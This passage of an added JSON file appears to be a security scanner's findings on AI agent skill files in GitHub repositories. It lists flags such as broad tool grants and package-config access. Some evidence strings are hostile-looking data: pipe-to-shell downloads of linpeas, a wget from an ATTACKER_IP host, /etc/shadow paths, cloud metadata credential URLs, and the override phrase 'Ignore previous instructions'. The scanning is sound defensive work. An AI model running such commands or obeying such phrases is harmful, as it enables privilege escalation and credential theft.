+      "score": 20,
+      "counts": {
+        "medium": 4
+      },
+      "flags": [
+        {
+          "id": "external-script-fetch",
+          "severity": "medium",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 11,
+          "evidence": "Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox.exe -OutFile busybox.exe"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "medium",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 12,
+          "evidence": "Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64.exe -OutFile busybox.exe"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "medium",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 13,
+          "evidence": "Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64u.exe -OutFile busybox.exe"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "medium",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 14,
+          "evidence": "Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64a.exe -OutFile busybox.exe"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/linux-privilege-escalation/skill.md#linux-privilege-escalation",
+      "name": "Linux Privilege Escalation",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/linux-privilege-escalation/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/linux-privilege-escalation/SKILL.md",
+      "level": "medium",
+      "score": 19,
+      "counts": {
+        "high": 1,
+        "medium": 3,
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "high",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 137,
+          "evidence": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 269,
+          "evidence": "/etc/shadow"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 285,
+          "evidence": "/etc/shadow"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 464,
+          "evidence": "/etc/shadow"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 137,
+          "evidence": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 156,
+          "evidence": "wget http://ATTACKER_IP:8000/linpeas.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/infrastructure-lambda-labs/skill.md#lambda-labs-gpu-cloud",
+      "name": "lambda-labs-gpu-cloud",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/infrastructure-lambda-labs/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/infrastructure-lambda-labs/SKILL.md",
+      "level": "medium",
+      "score": 18,
+      "counts": {
+        "medium": 3
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 55,
+          "evidence": "~/.ssh"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 286,
+          "evidence": "~/.ssh"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 296,
+          "evidence": "~/.ssh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/cloud-penetration-testing/skill.md#cloud-penetration-testing",
+      "name": "Cloud Penetration Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/cloud-penetration-testing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/cloud-penetration-testing/SKILL.md",
+      "level": "medium",
+      "score": 18,
+      "counts": {
+        "high": 1,
+        "low": 4,
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "high",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 22,
+          "evidence": "curl https://sdk.cloud.google.com | bash"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 254,
+          "evidence": "http://169.254.169.254/latest/meta-data/"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 255,
+          "evidence": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 258,
+          "evidence": "http://169.254.169.254/latest/api/token\""
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 259,
+          "evidence": "http://169.254.169.254/latest/meta-data/profile"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "medium",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 374,
+          "evidence": "http://169.254.169.254/latest/meta-data/`"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/supply-chain-guard/skill.md#supply-chain-guard",
+      "name": "supply-chain-guard",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/supply-chain-guard/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/supply-chain-guard/SKILL.md",
+      "level": "medium",
+      "score": 18,
+      "counts": {
+        "medium": 6
+      },
+      "flags": [
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 301,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 306,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 193,
+          "evidence": ".pypirc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 195,
+          "evidence": ".pypirc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "script",
+          "line": 197,
+          "evidence": ".pypirc"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "medium",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "script",
+          "line": 226,
+          "evidence": "crontab -"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/safety-alignment-nemo-guardrails/skill.md#nemo-guardrails",
+      "name": "nemo-guardrails",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/safety-alignment-nemo-guardrails/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/safety-alignment-nemo-guardrails/SKILL.md",
+      "level": "low",
+      "score": 14,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "instruction-override",
+          "severity": "medium",
+          "title": {
+            "zh": "覆盖既有指令",
+            "en": "Instruction override"
+          },
+          "where": "body",
+          "line": 51,
+          "evidence": "Ignore previous instructions"
+        },
+        {
+          "id": "instruction-override",
+          "severity": "medium",
+          "title": {
+            "zh": "覆盖既有指令",
+            "en": "Instruction override"
+          },
+          "where": "body",
+          "line": 67,
+          "evidence": "Ignore all previous instructions"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/linux-shell-scripting/skill.md#linux-production-shell-scripts",
+      "name": "Linux Production Shell Scripts",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/linux-shell-scripting/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/linux-shell-scripting/SKILL.md",
+      "level": "low",
+      "score": 14,
+      "counts": {
+        "low": 1,
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 337,
+          "evidence": "crontab -"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "medium",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 485,
+          "evidence": "crontab -"
+        }
+      ]
+    },
+    {
+      "id": "skill:huangwb8/skills:awesome-code/agents/mirror-optimizer/skill.md#mirror-optimizer",
+      "name": "mirror-optimizer",
+      "type": "skill",
+      "repo": "huangwb8/skills",
+      "path": "awesome-code/agents/mirror-optimizer/SKILL.md",
+      "url": "https://github.com/huangwb8/skills/blob/HEAD/awesome-code/agents/mirror-optimizer/SKILL.md",
+      "level": "low",
+      "score": 14,
+      "counts": {
+        "medium": 1,
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "package-config-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "body",
+          "line": 55,
+          "evidence": ".npmrc"
+        },
+        {
+          "id": "package-config-access",
+          "severity": "low",
+          "title": {
+            "zh": "触碰包管理配置",
+            "en": "Package manager config access"
+          },
+          "where": "body",
+          "line": 101,
+          "evidence": ".npmrc"
+        }
+      ]
+    },
+    {
+      "id": "skill:joneqian/claude-skills-suite:skills/sequelize-patterns/skill.md#sequelize-patterns",
+      "name": "sequelize-patterns",
+      "type": "skill",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "skills/sequelize-patterns/SKILL.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/skills/sequelize-patterns/SKILL.md",
+      "level": "low",
+      "score": 14,
+      "counts": {
+        "low": 1,
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "low",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 26,
+          "evidence": "存在零宽字符(常见于文档站抓取残留,需人工确认)"
+        },
+        {
+          "id": "sql-destructive",
+          "severity": "medium",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 44,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/bun-development/skill.md#bun-development",
+      "name": "bun-development",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/bun-development/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/bun-development/SKILL.md",
+      "level": "low",
+      "score": 13,
+      "counts": {
+        "low": 5
+      },
+      "flags": [
+        {
+          "id": "remote-code-exec",
+          "severity": "low",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 24,
+          "evidence": "curl -fsSL https://bun.sh/install | bash"
+        },
+        {
+          "id": "remote-code-exec",
+          "severity": "low",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 27,
+          "evidence": "irm bun.sh/install.ps1 | iex"
+        },
+        {
+          "id": "remote-code-exec",
+          "severity": "low",
+          "title": {
+            "zh": "远程脚本直接执行",
+            "en": "Pipe-to-shell remote execution"
+          },
+          "where": "body",
+          "line": 582,
+          "evidence": "curl -fsSL https://bun.sh/install | bash"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 24,
+          "evidence": "curl -fsSL https://bun.sh"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 582,
+          "evidence": "curl -fsSL https://bun.sh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/business-marketing/app-builder/skill.md#app-builder",
+      "name": "app-builder",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/business-marketing/app-builder/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/business-marketing/app-builder/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/creative-design/game-development/skill.md#game-development",
+      "name": "game-development",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/creative-design/game-development/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/creative-design/game-development/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/accessibility/skill.md#accessibility",
+      "name": "accessibility",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/accessibility/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/accessibility/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 237,
+          "evidence": "白色隐藏文本样式:color: #fff"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/esm/skill.md#esm",
+      "name": "esm",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/esm/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/esm/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "medium",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 291,
+          "evidence": "https://bit.ly/3FKwcWd"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/hypothesis-generation/skill.md#hypothesis-generation",
+      "name": "hypothesis-generation",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/hypothesis-generation/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/hypothesis-generation/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/paper-2-web/skill.md#paper-2-web",
+      "name": "paper-2-web",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/paper-2-web/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/paper-2-web/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/peer-review/skill.md#peer-review",
+      "name": "peer-review",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/peer-review/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/peer-review/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/pptx-posters/skill.md#latex-posters",
+      "name": "latex-posters",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/pptx-posters/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/pptx-posters/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/research-grants/skill.md#research-grants",
+      "name": "research-grants",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/research-grants/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/research-grants/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/scientific-critical-thinking/skill.md#scientific-critical-thinking",
+      "name": "scientific-critical-thinking",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/scientific-critical-thinking/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/scientific-critical-thinking/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/scientific/scientific-writing/skill.md#scientific-writing",
+      "name": "scientific-writing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/scientific/scientific-writing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/scientific/scientific-writing/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/web-development/roier-seo/skill.md#roier-seo",
+      "name": "roier-seo",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/web-development/roier-seo/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/web-development/roier-seo/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 301,
+          "evidence": "白色隐藏文本样式:color: #fff"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/creative-design/accessibility-auditor/skill.md#accessibility-auditor",
+      "name": "Accessibility Auditor",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/creative-design/accessibility-auditor/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/creative-design/accessibility-auditor/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 327,
+          "evidence": "白色隐藏文本样式:color: #fff"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/creative-design/game-development/multiplayer/skill.md#multiplayer",
+      "name": "multiplayer",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/creative-design/game-development/multiplayer/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/creative-design/game-development/multiplayer/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/database/neon-instagres/skill.md#neon-instagres",
+      "name": "neon-instagres",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/database/neon-instagres/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/database/neon-instagres/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/bash-linux/skill.md#bash-linux",
+      "name": "bash-linux",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/bash-linux/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/bash-linux/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/deployment-procedures/skill.md#deployment-procedures",
+      "name": "deployment-procedures",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/deployment-procedures/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/deployment-procedures/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/mermaid-diagram-specialist/skill.md#mermaid-diagram-specialist",
+      "name": "mermaid-diagram-specialist",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/mermaid-diagram-specialist/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/mermaid-diagram-specialist/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 514,
+          "evidence": "白色隐藏文本样式:color:#fff"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/powershell-windows/skill.md#powershell-windows",
+      "name": "powershell-windows",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/powershell-windows/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/powershell-windows/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/server-management/skill.md#server-management",
+      "name": "server-management",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/server-management/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/server-management/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/development/tdd-workflow/skill.md#tdd-workflow",
+      "name": "tdd-workflow",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/tdd-workflow/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/tdd-workflow/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
